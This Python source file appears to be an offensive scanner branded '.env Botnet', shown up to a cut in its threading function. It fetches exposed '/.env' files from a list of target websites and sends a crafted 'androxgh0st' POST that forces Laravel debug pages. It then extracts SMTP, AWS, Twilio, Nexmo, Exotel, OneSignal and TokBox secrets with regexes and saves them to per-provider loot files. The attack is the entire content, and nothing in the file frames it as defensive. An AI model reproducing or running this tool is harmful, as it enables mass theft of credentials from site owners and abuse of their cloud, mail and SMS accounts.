from multiprocessing.dummy import Pool
import warnings,random,socket
from re import findall as reg
import requests, re, sys, os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
from time import time as timer  
import time
init()

Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

def sparkpostmail():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sparkpostmail=on" in ip_listx:
    sparkpostmail = "on"
    return sparkpostmail
  else:
    sparkpostmail = "off"
    return sparkpostmail
def and1():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "and1=on" in ip_listx:
    and1 = "on"
    return and1
  else:
    and1 = "off"
    return and1
def mandrillapp():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mandrillapp=on" in ip_listx:
    mandrillapp = "on"
    return mandrillapp
  else:
    mandrillapp = "off"
    return mandrillapp
def zoho():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zoho=on" in ip_listx:
    zoho = "on"
    return zoho
  else:
    zoho = "off"
    return zoho
def sendgrid():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendgrid=on" in ip_listx:
    sendgrid = "on"
    return sendgrid
  else:
    sendgrid = "off"
    return sendgrid
def office365():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "office365=on" in ip_listx:
    office365 = "on"
    return office365
  else:
    office365 = "off"
    return office365
def mailgun():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mailgun=on" in ip_listx:
    mailgun = "on"
    return mailgun
  else:
    mailgun = "off"
    return mailgun

def aws():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "aws=on" in ip_listx:
    aws = "on"
    return aws
  else:
    aws = "off"
    return aws
def twillio():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "twillio=on" in ip_listx:
    twillio = "on"
    return twillio
  else:
    twillio = "off"
    return twillio

def AWS_ACCESS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_ACCESS_KEY=on" in ip_listx:
    AWS_ACCESS_KEY = "on"
    return AWS_ACCESS_KEY
  else:
    AWS_ACCESS_KEY = "off"
    return AWS_ACCESS_KEY

def AWS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_KEY=on" in ip_listx:
    AWS_KEY = "on"
    return AWS_KEY
  else:
    AWS_KEY = "off"
    return AWS_KEY

def NEXMO():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "NEXMO=on" in ip_listx:
    NEXMO = "on"
    return NEXMO
  else:
    NEXMO = "off"
    return NEXMO

def EXOTEL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "EXOTEL=on" in ip_listx:
    EXOTEL = "on"
    return EXOTEL
  else:
    EXOTEL = "off"
    return EXOTEL
def ONESIGNAL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "ONESIGNAL=on" in ip_listx:
    ONESIGNAL = "on"
    return ONESIGNAL
  else:
    ONESIGNAL = "off"
    return ONESIGNAL

def TOKBOX():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "TOKBOX=on" in ip_listx:
    TOKBOX = "on"
    return TOKBOX
  else:
    TOKBOX = "off"
    return TOKBOX




def prepare(sites):

    try:
      meki = requests.get(sites+'/.env',headers=Headers,timeout=8)
      if 'DB_PASSWORD=' in meki.text:
        print("\033[1;40m[x] {} ===>   \033[1;32;40mSuccess".format(str(sites)))
        open('config-'+year+month+day+'.txt', 'a').write("\
---------------Cannabis env-------------\
"+sites+"\
"+meki.text + '\
-----------------------------------------\
\
')
      else:
        print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(sites)))
    except Exception as e:
        pass

def get_smtp(url,text):
  try:
    if "MAIL_HOST" in text:
      if "MAIL_HOST=" in text:
        
        mailhost = reg("\
MAIL_HOST=(.*?)\
", text)[0]
        mailport = reg("\
MAIL_PORT=(.*?)\
", text)[0]
        mailuser = reg("\
MAIL_USERNAME=(.*?)\
", text)[0]
        mailpass = reg("\
MAIL_PASSWORD=(.*?)\
", text)[0]
        build = 'URL: '+str(url)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)
        remover = str(build).replace('\\r', '')
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\
MAIL_HOST=(.*?)\
", text)[0]
          mailport = reg("\
MAIL_PORT=(.*?)\
", text)[0]
          mailuser = reg("\
MAIL_USERNAME=(.*?)\
", text)[0]
          mailpass = reg("\
MAIL_PASSWORD=(.*?)\
", text)[0]
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)
          remover = str(build).replace('\\r', '')
          print("\033[1;40m[x] {} ===>   \033[1;32;40m amazonaws".format(str(url)))
          save = open(getcountry+'.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":

          print("\033[1;40m[x] {} ===>   \033[1;32;40mSendgrid".format(str(url)))
          save = open('Resultz/sendgrid.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40mmailgun".format(str(url)))
          save = open('Resultz/mailgun.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40msparkpostmail".format(str(url)))
          save = open('Resultz/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40mmandrillapp".format(str(url)))
          save = open('Resultz/mandrill.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40mzoho".format(str(url)))
          save = open('Resultz/zoho.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40m1and1".format(str(url)))
          save = open('Resultz/1and1.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "smtp.office365.com" and office365() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40moffice365".format(str(url)))
          save = open('Resultz/office365.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
          print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(url)))
        print("\033[1;40m[x] {} ===>   \033[1;32;40mSMTP".format(str(url)))
        save = open('Resultz/SMTP_RANDOM.txt', 'a')
        save.write(str(remover)+'\
\
')
        save.close()
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed SMTP".format(str(url)))

    if "TWILIO_ACCOUNT_SID=" in text and twillio() == "on":
      print("\033[1;40m[x] {} ===>   \033[1;32;40mTwillio".format(url))
      acc_sid = reg('\
TWILIO_ACCOUNT_SID=(.*?)\
', text)[0]
      acc_key = reg('\
TWILIO_API_KEY=(.*?)\
', text)[0]
      sec = reg('\
TWILIO_API_SECRET=(.*?)\
', text)[0]
      chatid = reg('\
TWILIO_CHAT_SERVICE_SID=(.*?)\
', text)[0]
      phone = reg('\
TWILIO_NUMBER=(.*?)\
', text)[0]
      auhtoken = reg('\
TWILIO_AUTH_TOKEN=(.*?)\
', text)[0]

      build = 'URL: '+url+'\
TWILIO_ACCOUNT_SID: '+str(acc_sid)+'\
TWILIO_API_KEY: '+str(acc_key)+'\
TWILIO_API_SECRET: '+str(sec)+'\
TWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\
TWILIO_NUMBER: '+str(phone)+'\
TWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = build.replace('\\r', '')
      save = open('Resultz/twillio.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'TWILIO_ACCOUNT_SID=' not in text or 'TWILIO_ACCOUNT_SID=' in text and twillio() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed Twillio".format(str(url)))

    if 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "on":
      print("\033[1;40m[x] {} ===>   \033[1;32;40mAWS_ACCESS_KEY".format(str(url)))
      mailhost = reg("\
AWS_ACCESS_KEY_ID=(.*?)\
", text)[0]
      mailport = reg("\
AWS_SECRET_ACCESS_KEY=(.*?)\
", text)[0]
      mailuser = reg("\
AWS_DEFAULT_REGION=(.*?)\
", text)[0]
      build = 'URL: '+str(url)+'\
AWS_ACCESS_KEY_ID: '+str(mailhost)+'\
AWS_SECRET_ACCESS_KEY: '+str(mailport)+'\
AWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/'+mailuser+'.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'AWS_ACCESS_KEY_ID=' not in text or 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed AWS_ACCESS_KEY".format(str(url)))

    if 'AWS_KEY=' in text and AWS_KEY() == "on":
      print("\033[1;40m[x] {} ===>   \033[1;32;40mAWS_ACCESS_KEY".format(str(url)))
      mailhost = reg("\
AWS_KEY=(.*?)\
", text)[0]
      mailport = reg("\
AWS_SECRET=(.*?)\
", text)[0]
      mailuser = reg("\
AWS_REGION=(.*?)\
", text)[0]
      build = 'URL: '+str(url)+'\
AWS_KEY: '+str(mailhost)+'\
AWS_SECRET: '+str(mailport)+'\
AWS_REGION: '+str(mailuser)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/'+mailuser+'.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'AWS_KEY=' not in text or 'AWS_KEY=' in text and AWS_KEY() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed AWS_KEY".format(str(url)))

    if "NEXMO" in text and NEXMO() == "on":
      if "NEXMO_KEY=" in text:
        try:
          nexmo_key = reg('\
NEXMO_KEY=(.*?)\
', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\
NEXMO_SECRET=(.*?)\
', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\
NEXMO_NUMBER=(.*?)\
', text)[0]
        except:
          phone = ''
        print("\033[1;40m[x] {} ===>   \033[1;32;40mNEXMO".format(str(url)))
        build = 'URL: '+str(url)+'\
nexmo_key: '+str(nexmo_key)+'\
nexmo_secret: '+str(nexmo_secret)+'\
phone: '+str(phone)
        remover = str(build).replace('\\r', '')
        save = open('Resultz/NEXMO.txt', 'a')
        save.write(remover+'\
\
')
        save.close()
    elif 'NEXMO_KEY=' not in text or 'NEXMO_KEY=' in text and NEXMO() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed NEXMO".format(str(url)))
    if "EXOTEL_API_KEY" in text and EXOTEL() == "on":
      if "EXOTEL_API_KEY=" in text:
        try:
          exotel_api = reg('\
EXOTEL_API_KEY=(.*?)\
', text)[0]
        except:
          exotel_api = ''
        try:
          exotel_token = reg('\
EXOTEL_API_TOKEN=(.*?)\
', text)[0]
        except:
          exotel_token = ''
        try:
          exotel_sid = reg('\
EXOTEL_API_SID=(.*?)\
', text)[0]
        except:
          exotel_sid = ''
        print("\033[1;40m[x] {} ===>   \033[1;32;40mEXOTEL".format(str(url)))
        build = 'URL: '+str(url)+'\
EXOTEL_API_KEY: '+str(exotel_api)+'\
EXOTEL_API_TOKEN: '+str(exotel_token)+'\
EXOTEL_API_SID: '+str(exotel_sid)
        remover = str(build).replace('\\r', '')
        save = open('Resultz/EXOTEL.txt', 'a')
        save.write(remover+'\
\
')
        save.close()
    elif 'EXOTEL_API_KEY=' not in text or 'EXOTEL_API_KEY=' in text and EXOTEL() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed EXOTEL".format(str(url)))


    if "ONESIGNAL_APP_ID" in text and ONESIGNAL() == "on":
      if "ONESIGNAL_APP_ID=" in text:
        try:
          onesignal_id = reg('\
ONESIGNAL_APP_ID=(.*?)\
', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_token = reg('\
ONESIGNAL_REST_API_KEY=(.*?)\
', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_auth = reg('\
ONESIGNAL_USER_AUTH_KEY=(.*?)\
', text)[0]
        except:
          onesignal_auth = ''
        print("\033[1;40m[x] {} ===>   \033[1;32;40mONESIGNAL".format(str(url)))
        build = 'URL: '+str(url)+'\
ONESIGNAL_APP_ID: '+str(onesignal_id)+'\
ONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\
ONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
        remover = str(build).replace('\\r', '')
        save = open('Resultz/ONESIGNAL.txt', 'a')
        save.write(remover+'\
\
')
        save.close()
    elif 'ONESIGNAL_APP_ID=' not in text or 'ONESIGNAL_APP_ID=' in text and ONESIGNAL() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed ONESIGNAL".format(str(url)))

    if "TOKBOX_KEY_DEV" in text and TOKBOX() == "on":
      if "TOKBOX_KEY_DEV=" in text:
        try:
          tokbox_key = reg('\
TOKBOX_KEY_DEV=(.*?)\
', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\
TOKBOX_SECRET_DEV=(.*?)\
', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url)))
        build = 'URL: '+str(url)+'\
TOKBOX_KEY_DEV: '+str(tokbox_key)+'\
TOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\\r', '')
        save = open('Resultz/TOKBOX.txt', 'a')
        save.write(remover+'\
\
')
        save.close()
    elif 'TOKBOX_KEY_DEV=' not in text or 'TOKBOX_KEY_DEV=' in text and TOKBOX() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url)))

    if "TOKBOX_KEY" in text and TOKBOX() == "on":
      if "TOKBOX_KEY=" in text:
        try:
          tokbox_key = reg('\
TOKBOX_KEY=(.*?)\
', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\
TOKBOX_SECRET=(.*?)\
', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url)))
        build = 'URL: '+str(url)+'\
TOKBOX_KEY_DEV: '+str(tokbox_key)+'\
TOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\\r', '')
        save = open('Resultz/TOKBOX.txt', 'a')
        save.write(remover+'\
\
')
        save.close()
    elif 'TOKBOX_KEY_DEV=' not in text or 'TOKBOX_KEY_DEV=' in text and TOKBOX() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url)))




  except Exception as e:
    pass









def get_smtp2(url,text):
  try:
    if "MAIL_HOST" in text:
      if "<td>MAIL_HOST</td>" in text:
        print("\033[1;40m[x] {} ===>   \033[1;32;40mSMTP".format(str(url)))
        mailhost = reg('<td>MAIL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
        mailport = reg('<td>MAIL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
        mailuser = reg('<td>MAIL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
        mailpass = reg('<td>MAIL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
        build = 'URL: '+str(url)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)
        remover = str(build).replace('\\r', '')
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\
MAIL_HOST=(.*?)\
", text)[0]
          mailport = reg("\
MAIL_PORT=(.*?)\
", text)[0]
          mailuser = reg("\
MAIL_USERNAME=(.*?)\
", text)[0]
          mailpass = reg("\
MAIL_PASSWORD=(.*?)\
", text)[0]
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)
          remover = str(build).replace('\\r', '')
          print("\033[1;40m[x] {} ===>   \033[1;32;40m amazonaws".format(str(url)))
          save = open(getcountry+'.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":

          print("\033[1;40m[x] {} ===>   \033[1;32;40mSendgrid".format(str(url)))
          save = open('Resultz/sendgrid.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40mmailgun".format(str(url)))
          save = open('Resultz/mailgun.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40msparkpostmail".format(str(url)))
          save = open('Resultz/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40mmandrillapp".format(str(url)))
          save = open('Resultz/mandrill.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40mzoho".format(str(url)))
          save = open('Resultz/zoho.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40m1and1".format(str(url)))
          save = open('Resultz/1and1.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if "smtp.office365.com" and office365() == "on":
          print("\033[1;40m[x] {} ===>   \033[1;32;40moffice365".format(str(url)))
          save = open('Resultz/office365.txt', 'a')
          save.write(str(remover)+'\
\
')
          save.close()
        if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
          print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(url)))
        print("\033[1;40m[x] {} ===>   \033[1;32;40mSMTP".format(str(url)))
        save = open('Resultz/SMTP_RANDOM.txt', 'a')
        save.write(str(remover)+'\
\
')
        save.close()
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed SMTP".format(str(url)))

    if '<td>TWILIO_ACCOUNT_SID</td>' in text and twillio() == "on":
      print("\033[1;40m[x] {} ===>   \033[1;32;40mTwillio".format(str(url)))
      acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      acc_key = reg('<td>TWILIO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      sec = reg('<td>TWILIO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      phone = reg('<td>TWILIO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      build = 'URL: '+str(url)+'\
TWILIO_ACCOUNT_SID: '+str(acc_sid)+'\
TWILIO_API_KEY: '+str(acc_key)+'\
TWILIO_API_SECRET: '+str(sec)+'\
TWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\
TWILIO_NUMBER: '+str(phone)+'\
TWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/TWILLIO.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed Twillio".format(str(url)))
    if '<td>NEXMO_KEY</td>' in text and NEXMO() == "on":

      try:
        nexmo_key = reg('<td>NEXMO_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>EXMO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        phone = ''
      print("\033[1;40m[x] {} ===>   \033[1;32;40mNEXMO".format(str(url)))
      build = 'URL: '+str(url)+'\
nexmo_key: '+str(nexmo_key)+'\
nexmo_secret: '+str(nexmo_secret)+'\
phone: '+str(phone)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/NEXMO.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'NEXMO_KEY' not in text or 'NEXMO_KEY' in text and NEXMO() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed NEXMO".format(str(url)))


    if '<td>EXOTEL_API_KEY</td>' in text and EXOTEL() == "on":
      try:
        exotel_api = reg('<td>EXOTEL_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        exotel_api = ''
      try:
        exotel_token = reg('<td>EXOTEL_API_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        exotel_token = ''
      try:
        exotel_sid = reg('<td>EXOTEL_API_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        exotel_sid = ''
      print("\033[1;40m[x] {} ===>   \033[1;32;40mEXOTEL".format(str(url)))
      build = 'URL: '+str(url)+'\
EXOTEL_API_KEY: '+str(exotel_api)+'\
EXOTEL_API_TOKEN: '+str(exotel_token)+'\
EXOTEL_API_SID: '+str(exotel_sid)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/EXOTEL.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'EXOTEL_API_KEY' not in text or 'EXOTEL_API_KEY' in text and EXOTEL() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed EXOTEL".format(str(url)))


    if '<td>ONESIGNAL_APP_ID</td>' in text and ONESIGNAL() == "on":
      try:
        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        onesignal_id = ''
      try:
        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        onesignal_token = ''
      try:
        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        onesignal_auth = ''
      print("\033[1;40m[x] {} ===>   \033[1;32;40mONESIGNAL".format(str(url)))
      build = 'URL: '+str(url)+'\
ONESIGNAL_APP_ID: '+str(onesignal_id)+'\
ONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\
ONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/ONESIGNAL.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'ONESIGNAL_APP_ID' not in text or 'ONESIGNAL_APP_ID' in text and ONESIGNAL() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed ONESIGNAL".format(str(url)))
    if '<td>TOKBOX_KEY_DEV</td>' in text and TOKBOX() == "on":
      try:
        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url)))
      build = 'URL: '+str(url)+'\
TOKBOX_KEY_DEV: '+str(tokbox_key)+'\
TOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/TOKBOX.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'TOKBOX_KEY_DEV' not in text or 'TOKBOX_KEY_DEV' in text and TOKBOX() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url)))
    if '<td>TOKBOX_KEY</td>' in text:
      try:
        tokbox_key = reg('<td>TOKBOX_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url)))
      build = 'URL: '+str(url)+'\
TOKBOX_KEY_DEV: '+str(tokbox_key)+'\
TOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\\r', '')
      save = open('Resultz/TOKBOX.txt', 'a')
      save.write(remover+'\
\
')
      save.close()
    elif 'TOKBOX_KEY_DEV' not in text or 'TOKBOX_KEY_DEV' in text and TOKBOX() == "off":
      pass
    else:
      print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url)))


  except Exception as e:
    pass


def di_chckngntd(url):
  try:
    text = '\033[32;1m#\033[0m '+url
    headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
    get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
    if "APP_KEY=" in str(get_source):
      get_smtp(url+"/.env",str(get_source))
    else:
      get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source:
        get_smtp2(url,get_source)
      else:
        print("\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(url)))
  except Exception as e:
    
    pass






def checkset():

  AWS_ACCESS_KEYx=AWS_ACCESS_KEY()
  AWS_KEYx=AWS_KEY()
  twilliox=twillio()
  awsx=aws()
  sparkpostmailx = sparkpostmail()
  and1x = and1()
  mandrillappx = mandrillapp()
  zohox = zoho()
  sendgridx = sendgrid()
  office365x = office365()
  mailgunx = mailgun()
  NEXMOx=NEXMO()
  EXOTELx=EXOTEL()
  ONESIGNALx=ONESIGNAL()
  TOKBOXx=TOKBOX()
  print("amazonaws:"+awsx+"|twillio:"+twilliox+"|AWS_KEY:"+AWS_KEYx+"|AWS_ACCESS_KEY:"+AWS_ACCESS_KEYx+"|sparkpostmail:"+sparkpostmailx+"\
1and1:"+and1x+"|mandrillapp:"+mandrillappx+"|zoho:"+zohox+"|sendgrid:"+sendgridx+"|office365:"+office365x+"|mailgun:"+mailgunx+"\
|NEXMO:"+NEXMOx+"|EXOTEL:"+EXOTELx+"|ONESIGNAL:"+ONESIGNALx+"|TOKBOX:"+TOKBOXx)

def logo():
    clear = "\\x1b[0m"

    x = """\033[1;32;40m
_________                         _     _     
\\_   ___ \\ __ _ _ __  _ __   __ _| |__ (_)___ 
/    \\  \\// _` | '_ \\| '_ \\ / _` | '_ \\| / __|
\\     \\___ (_| | | | | | | | (_| | |_) | \\__ \\\\
 \\______  /__,_|_| |_|_| |_|\\__,_|_.__/|_|___/
        \\/ 

 \033[1;30;40mVersion  \033[1;40m: \033[1;33;40m.env Botnet
"""
    print(x)
    
logo()

def menucit():
  sdx = """
 \033[1;37;40m1]  grab .env [Get all data in .env]
 \033[1;37;40m2]  grab .env [Grab .env and Laravel debug with settings.ini]
 \033[1;37;40m3]  check settings.ini
 """
  print(sdx)

def jembotngw(sites):
  if 'http' not in sites:
    site = 'http://'+sites

    prepare(site)
  else:
    prepare(sites)





def jembotngw2(sites):


  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd(site)
  else:
    di_chckngntd(sites)

def prepare2(sites):

  di_chckngntd(sites)





def nowayngntd():

  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\
')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare(site)
    else:
      prepare(sites)

def makethread(jumlah):
  try:
